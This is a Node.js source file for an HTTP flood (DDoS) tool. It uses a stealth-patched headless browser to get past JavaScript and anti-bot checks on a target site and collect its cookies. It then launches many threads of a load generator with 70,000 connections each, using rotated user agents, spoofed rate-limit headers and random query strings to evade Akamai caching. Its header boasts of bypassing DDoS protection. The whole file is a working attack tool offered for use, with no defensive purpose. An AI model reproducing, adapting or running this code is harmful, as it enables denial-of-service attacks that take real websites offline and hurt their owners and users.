/* 


METHOD BY: UsersIs and Card_Holder
Bypassed: ALl Ddos-Gur


*/
var TARGET;

if(process.argv[2] === undefined){
    console.log("Wrong Usage!");
    return false;
    process.exit(3162);
} else {
    TARGET = process.argv[2].replace("\"", "");
    if(TARGET.includes("%RAND%")){
        if(process.argv.length < 8)
        {
            console.log("Wrong Usage!");
            process.exit(3162);
        }
    }
}

var executablePath;
const clown = require("cloudscraper");
const os = require('os');
const osPlatform = os.platform();
if (/^win/i.test(osPlatform)) {
    executablePath = '';
}else if (/^linux/i.test(osPlatform)) {
    executablePath = '/usr/bin/chromium-browser';
}
var fs = require("fs");
var uas =  fs.readFileSync('uagent.txt', 'utf-8').replace(/\r/g, '').split('\n');

var rateh =  fs.readFileSync("rate_headers.txt", 'utf-8').replace(/\r/g, '').split('\n');
var ratehrand = rateh[Math.floor(Math.random()* rateh.length)]
var ratev =  fs.readFileSync("rate_value.txt", 'utf-8').replace(/\r/g, '').split('\n');
var ratevrand = ratev[Math.floor(Math.random()* ratev.length)]
var COOKIES;
const {spawn} = require('child_process')
const sleep = require("atomic-sleep");
const EventEmitter = require('events');
const puppeteer = require('puppeteer-extra')
var BROWSER;
var INDEX_RAND;
if(TARGET.includes("%RAND%")){RAND = 1; BROWSER = TARGET.replace("%RAND%", ""); INDEX_RAND = TARGET.indexOf("%RAND%");}else{BROWSER = TARGET}
var THREADS = process.argv[3];
var TIME = process.argv[4];
var jsCheck = process.argv[5]
var rateAkamai = process.argv[6]
var proPath,
queryStrings
function RandomString(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
       result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
  }
  const TryCommands = {
    pather: ['logo.ico', 'main.php', 'login', 'login.php', 'register','register.php','home','manifest.json','favicon.png','img','assets/js','images', 'redbean','lib/css','lib/core','application/json','application/templates', 'admin', 'phpmyadmin', 'assets/js', 'assets/css','assets/fonts','assets/flags','assets/fonts', 'admin/assets','logout.php']
}
  if(rateAkamai == 'true' || rateAkamai == true) {
    queryStrings = RandomString(12)
    proPath = BROWSER + `?${queryStrings}`
} else {
    proPath = TryCommands.pather[Math.floor(Math.random() * TryCommands.pather.length)]
    var result = BROWSER + proPath
}


const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
process.setMaxListeners(0);
EventEmitter.defaultMaxListeners = Infinity;
EventEmitter.prototype._maxListeners = Infinity;
process.on('uncaughtException', function (err) { console.log(err) });
process.on('unhandledRejection', function (err) { console.log(err) });
async function GetCookies(){
    String.prototype.replaceBetween = function(start, end, what) {
        return this.substring(0, start) + what + this.substring(end);
    };
    console.log(jsCheck)
var headlesser;
if(rateAkamai == 'true') {
    ratehrand = 'Akamai-Origin-Hop'
}
if(jsCheck == 'false'){
headlesser=false
console.log('headlesser: false')
} else {
    headlesser = true
}
    
    console.log(`[+] Attack start: {
        TARGETv2: ${TARGET}
        VALUER_HASH: {}
    }`)
    console.log(`Exclude Pathing: ${result}`)
    const StealthPlugin = require('puppeteer-extra-plugin-stealth')
    puppeteer.use(StealthPlugin())
    puppeteer.launch({ headless: headlesser,
    product: 'chrome',executablePath: executablePath, args: [
        '--no-sandbox',
       '--disable-gpu',
        '--disable-canvas-aa', 
       '--disable-2d-canvas-clip-aa', 
        '--disable-gl-drawing-for-tests', 
        '--disable-dev-shm-usage', 
        '--no-zygote', 
        '--use-gl=swiftshader', 
        '--enable-webgl',
        '--hide-scrollbars',
        '--mute-audio',
        '--no-first-run',
        '--disable-infobars',
        '--disable-breakpad',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
]}).then(async browser => {
        console.log("Browsing The WebSite....");
        const page = await browser.newPage();
        

//});

        var timers;
        await page.goto(BROWSER)
        console.log(BROWSER);
        if(jsCheck == 'false') {
            timers = 9500
          
        } else {
            timers = 2000
            console.log(true)
        }
       
        //await page.screenshot({ path: 'testresult.png', fullPage: true })
        await page.goto(BROWSER)
        //await page.screenshot({ path: 'testresult2.png', fullPage: true })
        await sleep(timers)
        COOKIES = await page.cookies()
        await browser.close()
        //console.log(COOKIES)
        for (i=0, len=COOKIES.length, F_COOKIES=""; i<len; i++){
            F_COOKIES += COOKIES[i]['name'] + ": " + COOKIES[i]['value'] + "; "
        }
        COOKIES = `\"${F_COOKIES}\"`
        console.log(COOKIES)
        for (i=0; i<THREADS; i++){
            console.log(`[]Thread ${i+1} Started!`)
            //./wrk -c 55000 -d 30 -t 10 http://88.198.16.90/
var ua = uas[Math.floor(Math.random()* uas.length)]
var normalua = `\"${ua}\"`
var normH = `\"${ratehrand}\"`
var normV = `\"${ratevrand}\"`
            let spawned = spawn("./http", [ "-c", '70000', '-d', TIME, '-t', '6', BROWSER, '-H', 'Cookie: ' + COOKIES + ' User-Agent: ' + normalua + ` ${ratehrand}: ${normV} `, TARGET]);
            spawned.stdout.on('data', (data) => {
                console.log(`stdout: ${data}`);
            });
            
            spawned.stderr.on('data', (data) => {
                console.error(`stderr: ${data}`);
            });
        }
    });
}

GetCookies();
